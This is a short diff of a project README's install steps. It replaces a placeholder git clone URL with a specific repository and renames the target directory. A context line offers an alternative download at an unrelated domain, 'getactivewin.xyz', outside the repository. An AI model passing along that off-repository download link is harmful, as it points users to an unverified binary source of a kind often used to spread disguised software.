@@ -43,13 +43,13 @@ ProjectZERO-ZeroFN is a custom batch script that provides a streamlined interfac
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/<your-username>/ProjectZERO-ZeroFN.git
+   git clone https://github.com/HarrisSagiris/ZeroFN.git
    ```
    or download here : getactivewin.xyz
 
 2. Navigate to the project directory:
    ```bash
-   cd ProjectZERO-ZeroFN
+   cd ZeroFN
    ```
 
 3. Run the script:
